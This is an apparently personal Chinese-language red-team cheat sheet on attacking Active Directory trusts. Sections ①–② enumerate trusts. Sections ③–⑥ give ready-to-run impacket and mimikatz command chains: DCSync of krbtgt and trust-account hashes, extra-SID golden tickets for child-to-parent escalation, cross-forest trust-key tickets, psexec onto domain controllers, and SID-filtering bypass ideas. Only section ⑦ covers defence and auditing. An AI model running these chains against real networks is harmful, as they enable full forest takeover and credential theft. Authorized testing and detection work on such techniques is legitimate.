## ① 信任拓扑总览 — 四种信任与图上定位(BloodHound Trusts 边 / PowerView 函数)

来源:本地核实 `bloodhound-python --help`(`-c` 支持 `Trusts` 采集;源码 /usr/lib/python3/dist-packages/bloodhound/ad/ 用 `(objectClass=trustedDomain)` 过滤并有独立 trusts.py)、`~/tools/src/PowerSploit/Recon/PowerView.ps1`(函数名 grep 实测,共 102 个 function)

### 四种信任与判断要点

| 信任类型 | 谁和谁 | 关键 TrustAttributes 位 | 攻击含义 |
|---|---|---|---|
| 父子/树根信任 | 同林内父-子域、树根-林根 | `WITHIN_FOREST`(0x20),自动建立、可传递 | **林内不过滤 SID** → 子域 DA 可直上父域 EA(见 ③④ 节) |
| 快捷信任 | 同林内跨子树的两个域(省跳数) | `WITHIN_FOREST`(0x20)+ 通常 `UPLEVEL_ONLY`(0x2) | 同上,本质仍是林内信任 |
| 外部信任 | 任意两域(不同林/工作组) | 常无 `FOREST_TRANSITIVE`,`FILTER_SIDS`(0x4)默认开 | SID 过滤拦截 extraSid,转 ⑥ 节思路 |
| 林信任 | 林根对林根(林功能级别 ≥2003) | `FOREST_TRANSITIVE`(0x8)+ `FILTER_SIDS`;可叠加 `CROSS_ORGANIZATION`(0x10,选择性认证)、`CROSS_ORGANIZATION_NO_TGT_DELEGATION`(0x200) | 信任密钥路径跨林金票(见 ⑤ 节) |

TrustAttributes 完整位表(出自本机 PowerView.ps1 第 19630-19642 行的解码表,实测 grep 到;多个位同时置位按位或):

- `0x1` NON_TRANSITIVE(非传递)/ `0x2` UPLEVEL_ONLY(仅 2000+)/ `0x4` FILTER_SIDS(**SID 过滤/隔离已启用**)
- `0x8` FOREST_TRANSITIVE(林信任)/ `0x10` CROSS_ORGANIZATION(**选择性认证**)/ `0x20` WITHIN_FOREST(林内信任)
- `0x40` TREAT_AS_EXTERNAL(按外部信任处理)/ `0x80` TRUST_USES_RC4_ENCRYPTION(信任密钥仅 RC4,老环境)/ `0x100` TRUST_USES_AES_KEYS(AES)
- `0x200` CROSS_ORGANIZATION_NO_TGT_DELEGATION(**跨信任 TGT 委托被禁**,见 ⑤ 节)/ `0x400` PIM_TRUST(特权访问管理/堡垒林)

TrustDirection 读法:0=禁用,1=入站(对方能来),2=出站(我能过去),3=双向。**攻击只关心"我能过去"的方向**:2 或 3。

### BloodHound 采集信任关系

```bash
# Trusts 单独采(域内任意有效凭据;Default/DCOnly/All 都已包含 Trusts)
bloodhound-python -u <用户> -p '<密码>' -d <域> -dc <域控FQDN> -ns <域控IP> -c Trusts --zip
# 常规采集顺带拿到(推荐,一套数据全有):
bloodhound-python -u <用户> -p '<密码>' -d <域> -dc <域控FQDN> -ns <域控IP> -c All --zip
# 导入 BloodHound 后:域节点之间出现 TrustedBy 有向边;点边/查节点属性看
# TrustDirection 与 TrustAttributes,按上表翻译成"能不能打、怎么打"
```

注意:bloodhound-python 是 legacy 版(其 --help 自述 "ingestor for BloodHound LEGACY"),BloodHound 旧版/兼容界面均可导入;跨林环境要对**每个域各采一次**(采集器只采当前认证域的 trustedDomain 对象),拼出完整信任图。

### PowerView 信任函数(目标 Windows 机侧;函数名与参数均为本机 ps1 实测)

```powershell
# 本地导入(文件在 ~/tools/src/PowerSploit/Recon/PowerView.ps1,先传目标机)
Import-Module .\PowerView.ps1

Get-DomainTrust                          # 当前域全部信任:默认走 LDAP (objectClass=trustedDomain)
Get-DomainTrust -Domain <父域>           # 指定域查(通过已有会话/凭据跨域查询)
Get-DomainTrust -API                     # 改走 Win32 DsEnumerateDomainTrusts
Get-DomainTrust -NET                     # 改走 .NET GetAllTrustRelationships()
Get-ForestTrust                          # 林级信任(只列林信任,不含域间外部信任)
Get-ForestTrust -Forest <林A根域>        # 指定林
Get-DomainTrustMapping                   # 递归:当前域的所有信任逐跳展开成"信任地图"
```

参数速查(Get-DomainTrust | Get-ForestTrust | Get-DomainTrustMapping):

- Get-DomainTrust:`-Domain <域>`、`-API`(Win32 枚举)、`-NET`(.NET 枚举)、`-LDAPFilter`、`-Properties`、`-SearchBase`、`-Credential`(备选凭据)
- Get-ForestTrust:`-Forest <林>`、`-Credential`
- LDAP 输出会把 TrustAttributes 解码成 `FILTER_SIDS, WITHIN_FOREST` 这类逗号串(API 输出为数值),两种显示都按上面位表读

注意:PowerView 是域内 Windows 落地后的工具(见 [13-Windows落地工具箱](13-Windows落地工具箱.md) 的加载姿势);Linux 侧等价物是 bloodhound-python 和下面 ② 节的 ldapsearch,不必非跳 Windows。

## ② 信任枚举 — Windows 侧 nltest/netdom 与 Linux 等价路径

来源:本机实测 Kali **无** nltest/netdom(`which` 均空,两者是 Windows 内置);`/usr/bin/ldapsearch` 与 `impacket-GetADUsers -h`(自述 "Queries target domain for users data")实测在位

### Windows 侧(目标机/跳板上,nltest 系域成员机自带)

```cmd
:: 域内任意成员机:列出全部信任(含林外);/all_trusts 连禁用的一起出
nltest /domain_trusts /all_trusts
:: 定位某域的 DC 与信任可达性(返回 DC 名+GUID+信任标志)
nltest /dsgetdc:<父域>
:: netdom 版(RSAT 自带):只列信任关系
netdom query trust
```

### Linux 侧等价(凭据与 ① 节相同,ldapsearch 直接翻 TDO 对象)

```bash
# 直接 LDAP 查 trustedDomain 对象:名字/对端域/方向/属性位一次出全
ldapsearch -x -H ldap://<域控IP> -D '<域>\<用户>' -w '<密码>' \
  -b 'DC=test,DC=local' '(objectClass=trustedDomain)' \
  name flatName trustPartner trustDirection trustAttributes
# trustDirection/trustAttributes 是十进制数,按 ① 节位表翻译(如 32=WITHIN_FOREST;32+4=林内且过滤)
# GetADUsers 不是信任枚举工具,但 -dc-ip 指向"信任另一侧的 DC"即可枚举对端域用户,
# 用来验证信任连通性与对端账户名(输出含用户名/描述/最后设密时间):
impacket-GetADUsers -all '<域>/<用户>:<密码>' -dc-ip <对端域控IP>
```

参数速查:

- `nltest /domain_trusts /all_trusts`:信任清单(每行一个域,直接看域名列;该命令的 Flags 列与 ① 节 TrustAttributes 是两套编码,别混读)
- `netdom query trust`:纯信任列表;`nltest /dsgetdc:<域>`:验证跨域定位
- ldapsearch:`-b` 写本域 DN(DC 逐级);属性固定取 `name/flatName/trustPartner/trustDirection/trustAttributes`
- GetADUsers:`-all` 全量用户;`-dc-ip <对端域控IP>` 是跨域关键(身份仍用本域凭据,经信任透传认证)

注意:当前 nxc 版本实测无信任枚举开关(smb/ldap 的 --help 均无 --trusted 类参数),信任枚举用 bloodhound-python 或 ldapsearch;另外 DNS 侧可用 `dig SRV _ldap._tcp.dc._msdcs.<对端域> @<域控IP>` 无凭据探测对端域控存活(林/树 DNS 通常可解析)。

## ③ 子域打父域 — impacket-raiseChild 一键提权

来源:apt 包 `python3-impacket`(/usr/bin/impacket-raiseChild,-h 实测:自述 "Privilege Escalation from a child domain up to its forest")

**原理(为什么子域 DA 等于半个林管)**:Enterprise Admins 组(RID 519)只存在于林根域;而林内信任(父子/树根)历史上**不做 SID 过滤**(① 节位表:WITHIN_FOREST 且无 FILTER_SIDS)。所以拿到子域 DA → DCSync 子域 krbtgt → 伪造一张带"父域 EA 组 SID"的票据 → 票据经子域 KDC 向父域 referral 时 EA SID 原样透传 → 在父域/全林以 EA 身份放行。raiseChild 把这条链(子域 DCSync → 拿林根 SID → 伪造带 EA 的金票 → 打林根域控 dump 管理员)封装成一条命令。

```bash
# 前提:子域 DA 凭据(账密或哈希均可);Kerberos 环境按 12 号文档准备(krb5.conf + 对时)
# 一键:自动 dump 林根域 Administrator(RID 500)的哈希
impacket-raiseChild '<子域>/<子域DA>:<密码>'
# 顺手把伪造的金票存盘(后续手工复用,见 ④ 节用法):
impacket-raiseChild '<子域>/<子域DA>:<密码>' -w child2parent.ccache
# dump 完直接 psexec 上父域控(半交互 SYSTEM):
impacket-raiseChild '<子域>/<子域DA>:<密码>' -target-exec <父域控IP>
# 换目标:dump 林根域指定 RID 用户(默认 500):
impacket-raiseChild '<子域>/<子域DA>:<密码>' -targetRID <RID>
# 哈希/票据认证姿势(与全库 impacket 一致):
impacket-raiseChild '<子域>/<子域DA>' -hashes :<NT哈希>
KRB5CCNAME=<票据>.ccache impacket-raiseChild '<子域>/<用户>' -k -no-pass
```

参数速查(全部 -h 实测):

- 位置参数 `target`:`<子域>/<用户>[:<密码>]` —— **写子域**,工具自己去打父域
- `-w <文件>`:把中间生成的金票存成 ccache(等价 ④ 节手工产物)
- `-target-exec <地址>`:完成后对目标 psexec;`-targetRID <RID>`:dump 哪个用户(默认 500)
- 认证:`-hashes :<NT>` / `-aesKey <密钥>` / `-k`(吃 KRB5CCNAME)+ `-no-pass`

注意:raiseChild 内部先对子域 DC 做 DCSync 再跨域,因此**子域控与父域控都要能解析**(krb5.conf 两个 realm 都配、/etc/hosts 兜底,姿势同 12 号环境准备节);它默认动静不小(DCSync+大票据),OPSEC 敏感时用 ④ 节手工链控制票据参数。老环境补丁缺失时还有 MS14-068(goldenPac)一条路,见 [10-域渗透一条龙](10-域渗透一条龙.md) 阶段 4.4。

## ④ 跨域票据伪造 — impacket-ticketer -extra-sid 手工链

来源:apt 包 `python3-impacket`(/usr/bin/impacket-ticketer,-h 实测 v0.14.0.dev0:存在 `-extra-sid`,自述 "Comma separated list of ExtraSids to be included inside the ticket's PAC");票据伪造基础(四票种对比、describeTicket 检视)见 [12-Kerberos深度利用](12-Kerberos深度利用.md) 第 5 节

手工链与 raiseChild 的区别:票据参数全可控(用户名、有效期、附加组),且清楚每一步在干什么。**核心参数口径:`-domain-sid` 与签名密钥用子域,高权组 SID 用 `-extra-sid` 挂父域 EA**。

```bash
# ① 子域 krbtgt 哈希(子域 DA 凭据 DCSync;姿势同 10 号阶段 4.3)
impacket-secretsdump '<子域>/<子域DA>:<密码>'@<子域控IP> -just-dc-user krbtgt

# ② 父域(林根)SID:子域凭据经信任透传,对父域控查即可(RID 填 0)
impacket-lookupsid '<子域>/<子域DA>:<密码>'@<父域控IP> 0 | grep 'Domain SID'
#   → 输出 "Domain SID is: S-1-5-21-x-y-z"(域 SID 本体,不带 RID);EA 组 SID = 该值拼 RID:S-1-5-21-x-y-z-519
#   子域自身 SID 同法对子域控查一次(或 nxc ldap --get-sid)

# ③ 伪造:子域 krbtgt 签名 + 子域 SID + 父域 EA 挂进 ExtraSids
impacket-ticketer -nthash <子域krbtgt的NT> -domain-sid <子域SID> -domain <子域> \
  -extra-sid <父域SID>-519 -user-id 500 -duration 8 administrator
export KRB5CCNAME=administrator.ccache
klist    # 确认票据加载;PAC 明细用 describeTicket(12 号第 4 节)

# ④ 用票:对父域服务请求票据 —— 子域 KDC 自动发跨域 referral,
#    impacket 拿着 referral TGT 自动去父域 KDC 续取服务票(全程一条命令内完成)
impacket-getST -spn cifs/<父域控FQDN> -k -no-pass -dc-ip <子域控IP> '<子域>/administrator'
#    或直接上远程执行(getST 步骤可省):
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass <父域控FQDN>
#    同票据取多服务换 -spn:host/<主机>(计划任务/注册表)、http(WinRM)、mssql 等

# ⑤ 落袋:对父域控 DCSync(此时已是 EA),收尾姿势同 10 号阶段 5
impacket-secretsdump -k -no-pass <父域控FQDN> -just-dc-user krbtgt
```

参数速查(ticketer 相关;-h 实测):

- `-extra-sid <SID列表>`:逗号分隔,塞进 PAC 的 ExtraSids —— 跨域攻击的核心开关;**EA 组 SID 必须走这里**,不能用 `-groups`
- `-groups <RID列表>`(默认 513,512,520,518,519):RID 只会拼到 **`-domain-sid`(子域)** 前面 —— 默认里的 519 会变成"子域下的 519"(子域没有 EA 组,是无效 SID),所以父域 EA 必须完整 SID 从 `-extra-sid` 进
- `-domain-sid <子域SID>` + `-domain <子域>` + `-nthash <子域krbtgt>`(或 `-aesKey`):签名三件套,票据对子域 KDC 有效
- `-user-id 500` / `-duration <小时>`(默认 10 年,实战压短,同 12 号金票注意)
- getST:`-spn` 写**父域的 SPN**(触发 referral)、`-dc-ip` 写**子域 DC**(先认证到子域)、`-k -no-pass` 吃伪造票

注意:krb5.conf 里**父、子两个 realm 都要配 kdc**(impacket 跨域 referral 追踪要能找到父域 KDC,域名解析靠 krb5.conf 或 DNS);本机无多域实测环境,referral 自动追随为 impacket 文档化行为,单条命令若卡在跨域环节,先检查父域 realm 配置与对时。若该林已启用林内 SID 过滤(见 ⑥ 节),此链的 EA 会被剥掉,票据仍有效但只剩子域权限。

## ⑤ 跨林攻击 — 信任密钥获取、跨林金票、选择性认证与 TGT 委托

来源:impacket -h 实测(secretsdump/getST/ticketer);PowerView 位表实测(0x10/0x200);跨林机制部分标注置信度。场景:已拿下**林 A 的林根域 DA**,目标**林 B** 与 A 之间是林信任。

### 5.1 林信任密钥获取(跨林金票的前置)

林信任建立时两侧各存一个信任账户,账户名 = **对端林根域的 NetBIOS 名 + `$`**(机器账户风格),其哈希即信任密钥(两侧对称同一把)。林 A 已是林根 DA → 直接 DCSync 林 A 根域控:

```bash
# 全量 dump 后在输出里找林 B 根域 NetBIOS 名的账户,如 B 根域 NetBIOS 为 OTHER 则找 "OTHER$"
impacket-secretsdump '<林A根域>/<林A的DA>:<密码>'@<林A根域控IP> -just-dc
# 只想确认信任账户存在,可按 LDAP 过滤精确 dump:
impacket-secretsdump '<林A根域>/<林A的DA>:<密码>'@<林A根域控IP> -just-dc-user 'OTHER$'
# 2012+ 的信任账户通常同时有 AES 密钥(dump 输出 aes256_hmac 行);
# 若信任属性带 TRUST_USES_RC4_ENCRYPTION(0x80)则只有 RC4 可用(① 节位表)
```

### 5.2 跨林金票(用信任密钥签"目标林本地用户"的 TGT)

思路:referral TGT 本来就是用信任密钥签发、由对端 KDC 验证的。我们自己用信任密钥伪造一张"**属于林 B 根域本地**"的管理员 TGT(B 的 KDC 能用信任密钥解开),PAC 里只有 B 本地 SID —— SID 过滤无外域 SID 可剥。此机制经 SpecterOps《Not a Security Boundary: Breaking Forest Trusts》系列文档化;本机无跨林环境,以下为机制等价写法(标注:未实测):

```bash
# 需先拿到林B根域 SID(对林B域控 lookupsid,条件:可达+匿名或已知凭据,视目标配置而定)
impacket-lookupsid '<林A根域>/<用户>:<密码>'@<林B根域控IP> 0 | grep 'Domain SID'

# 伪造"林B本地"票据:签名密钥=信任密钥,domain/domain-sid 全写林B
impacket-ticketer -nthash <信任密钥NT> -domain-sid <林B根域SID> -domain <林B根域> \
  -user-id 500 -duration 8 administrator
export KRB5CCNAME=administrator.ccache
# 用票:对林B服务请求票据,dc-ip 指林B的KDC(krb5.conf 配好林B realm)
impacket-getST -spn cifs/<林B机器FQDN> -k -no-pass -dc-ip <林B域控IP> '<林B根域>/administrator'
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass <林B机器FQDN>
# Windows 侧等价(mimikatz 经典形态,/rc4 填信任密钥):
mimikatz "kerberos::golden /user:Administrator /domain:<林B根域> /sid:<林B根域SID> /rc4:<信任密钥NT> /id:500 /ptt" exit
```

### 5.3 Selective Authentication(0x10)下的替代思路

信任属性带 `CROSS_ORGANIZATION`(选择性认证)时,受信林用户默认被 B 全域拒绝,须目标对象显式授权。思路(标注:机制为选择性认证的设计行为,具体效果未实测):

- **找"Allowed to Authenticate"授权**:选择性认证的放行机制 = B 林对象上给 A 林主体授 `Allowed to Authenticate` 扩展权(存 `msDS-AllowedToAuthenticateTo`)。枚举 B 林(需任一 B 侧可读凭据)找哪些对象给 A 林 SID/组授了权 → 集中打这些对象;LDAP 过滤 `msDS-AllowedToAuthenticateTo=*`。
- **绕过方向推断**:5.2 的伪造票自称"B 本地用户",是否被视为"受信林用户"从而受选择性认证约束 —— 按机制推断**不走该门槛**(选择闸针对跨林主体),标注为推断,需实测验证。
- **约束/资源约束委托跨林**:在 B 林内找配置了委托的账户(B 侧凭据枚举:`impacket-findDelegation '<林B域>/<用户>:<密码>' -dc-ip <林B域控IP>`,参数见 12 号第 6 节)。注意 2022-11 起 Windows 更新引入跨信任 RBCD 策略开关、2023-11 更新默认拦截跨信任的 RBCD 滥用(时间线为记忆整理,未见本机可核验来源,使用前先验证目标补丁位)。

### 5.4 TGT 跨信任委托(0x200 位)

信任属性缺 `CROSS_ORGANIZATION_NO_TGT_DELEGATION`(0x200)= 允许 TGT 跨信任委托,对应建信任界面"启用跨信任的 TGT 委派"勾选状态(新建林信任默认不启用勾选,即默认置 0x200;默认口径为文档整理,以实际枚举到的位为准)。攻击面:对方(或我方)林内**非约束委托主机**可收割跨林 TGT —— 诱骗林 B 的 DC/管理员认证到林 A 的 UD 主机(打印机 bug/PetitPotam 触发姿势见 12 号第 6 节),拿到的就是可跨林使用的 TGT,等效跨林全域凭据。枚举信任时把这个位当成"UD 收割能否跨林"的开关看。

参数速查:

- secretsdump `-just-dc-user 'OTHER$'`:按名精确 dump 信任账户(名字=对端林根域 NetBIOS+`$`;NT 哈希即信任密钥,AES 密钥同账户)
- ticketer 跨林口径:`-domain`/`-domain-sid` 写**目标林 B 根域**、`-nthash` 写**信任密钥**(与 ④ 节"全写子域"对照记忆:签名密钥换成谁,票据就"属于"谁的验签方)
- lookupsid `@<林B域控IP> 0`:取 B 根域 SID 的探测位
- findDelegation `-dc-ip <林B域控IP>`:对 B 侧枚举委托(跨林条件:凭据在 B 有效)

注意:跨林所有路径的第一步都是把 ① 节位表读准 —— `FOREST_TRANSITIVE`(真是林信任)还是外部信任(0x8 缺失):外部信任没有林级信息交换(msDS-TrustForestTrustInfo 缺失),只有域级 referral,5.2 的"林B根域本地用户"思路同样适用但作用域按外部信任对象算。5.1 账户命名(`对端NetBIOS$`)与 5.2 机制来自公开研究整理,本机无跨林环境未实测,打前先用 lookupsid/票据试探验证。

## ⑥ SID Filtering 边界与绕过思路

来源:过滤规则为公开文档化机制(PowerView 位表 0x4 实测佐证);绕过部分按要求标"思路"

**过滤边界(确定部分)**:`FILTER_SIDS`(0x4)在**外部信任**上默认启用、**林信任**默认启用;**林内信任**(父子/树根/快捷,`WITHIN_FOREST` 0x20)历史上**不**启用 —— 这就是 ③④ 节攻击成立的根因。过滤逻辑:票据/令牌里**不属于受信域 SID 空间的域级 SID 被丢弃**,只保留极少数 well-known 例外(Everyone、Authenticated Users 一类,提不了权)。因此:

- ④ 节的 `-extra-sid <父域SID>-519` 在**林内**畅通;拿到**外部信任**上打,EA SID 会被剥掉,票据退化为子域/受信域自身的权限。
- 判断靠**位标志不靠信任名称**:2000 时代建立的老信任升级后可能不带 `FILTER_SIDS` 位(或带 `TREAT_AS_EXTERNAL` 0x40 被当外部处理),先 `Get-DomainTrust`/ldapsearch 看实际位再选路。

**绕过思路(标注:思路,未经实测验证)**:

- **外来安全主体(FSP)成员关系不过滤**:受信域用户被**直接加入**受托域组(存为 foreignSecurityPrincipal 对象)是真实成员关系,不是 SID history,不受过滤。枚举受托域:`ldapsearch ... '(objectClass=foreignSecurityPrincipal)'` + BloodHound 图上查"哪些高权组含外来成员";我方控制的受信域用户若被拉进过受托域组,直接用真凭据过信任即得该组权限。
- **高权 SID 换家**:过滤剥的是"域间搬来的 SID";把 RID 500/512 挂在**受信域自己**的 SID 下伪造(`-domain-sid <受信域SID> -user-id 500`)只对受信域内有效,对受托域无用 —— 不要在这条上浪费时间,直接换 FSP/NTLM 路径。
- **2003 域功能级别差异**:林功能级别 2003 是林信任与选择性认证的**存在前提**;2003 之前只有外部信任/NT4 downlevel 信任,后者常见 `TRUST_USES_RC4_ENCRYPTION`(0x80)弱密钥且过滤语义混乱(NT4 信任无域 SID 空间可言)。遇到 0x80 信任:信任密钥是 RC4,爆破面与伪造面都更宽(思路级:dump 到信任账户后优先试 RC4 信任密钥签票据)。
- **打信任对象本身**:若对受托域的 TDO(trustedDomain 对象)有写权限,可改 `trustAttributes`(如去掉 0x4)/`msDS-TrustForestTrustInfo`(思路,改动会被 4706 类事件审计,见 ⑦ 节,慎用)。

注意:微软在 2020 年起的更新里为**林内信任**也提供了 SID 过滤启用选项(默认不启用,因为会破坏 SID history 迁移),拿到域后应重新读一次位表确认现状(此时间线为记忆整理,标注);`netdom /quarantine:yes` 是 Windows 侧开关命令(本机无 netdom,见 ② 节)。

## ⑦ 防御视角 — 隔离建议与审计

来源:Windows 侧命令标注为本机无(见 ② 节);事件号与建议为 AD 安全基线整理

### 建议状态(对照 ① 节位表逐项核查)

- **外部/林信任:SID Filter Quarantining 保持开启**(默认即开,`FILTER_SIDS` 位必须在):`netdom trust <本域> /domain:<对端域> /quarantine:yes /verify`(Windows 侧)
- **林内信任:评估启用 SID 过滤**(2020+ 更新提供):会断 SID history 迁移,迁移窗口期外的稳态域建议开 —— 直接消灭 ③④ 节整条攻击面
- **林信任叠加选择性认证**(`CROSS_ORGANIZATION`)+ 检查 `CROSS_ORGANIZATION_NO_TGT_DELEGATION` 已置位(禁跨林 TGT 委托,压掉 ⑤.4 的 UD 收割面)
- **信任密钥强算法**:淘汰 `TRUST_USES_RC4_ENCRYPTION`(0x80),确保 `TRUST_USES_AES_KEYS`(0x100);定期轮换信任密码(轮换入口:AD 域和信任向导里的"重置"或 `netdom trust ... /reset`,Windows 侧;轮换即换信任密钥,可砍断已泄漏密钥的存量伪造票)
- **堡垒林/PIM**(0x400):管理访问走专用特权林,生产林信任单向、最小化

### 审计与监控

```bash
# 定期快照信任对象(比对漂移:新增信任/属性变化即告警;Windows 侧配 4706/4707 事件联动)
ldapsearch -x -H ldap://<域控IP> -D '<域>\<用户>' -w '<密码>' \
  -b 'DC=test,DC=local' '(objectClass=trustedDomain)' \
  name trustPartner trustDirection trustAttributes whenChanged
```

- **4769(服务票据请求)**:跨域票据的特征是"服务名称 = `krbtgt/<其他域名>`"(referral TGT 签发)。重点告警:低权用户突然对 `krbtgt/<上游域>` 请求、票据选项异常、请求频率异常 —— ③④⑤ 节所有路径都会在这里留痕
- **4768(TGT 签发)**:核对"从不存在的用户名/异常加密类型";跨林金票(⑤.2)表现为凭空出现的"B 林本地管理员"请求模式
- **4706/4707**:新信任创建/移除(信任对象被攻击者改写的直接信号)
- **DCSync 面**:4769 里 `LDAP` 目录复制类 SPN 的请求(见 10 号阶段 4.3 的 DCSync 说明),信任攻击的中段几乎都踩 DCSync

注意:防御侧同样适用位表读法 —— 用 ① 节的 `ldapsearch` 快照做成基线,比逐条点开"AD 域和信任关系"控制台可靠;跨林攻击链(⑤)全部依赖"林根 DA + 信任密钥",所以 krbtgt/信任账户哈希的轮换(域维护)能直接砍断存量票据的可用性。
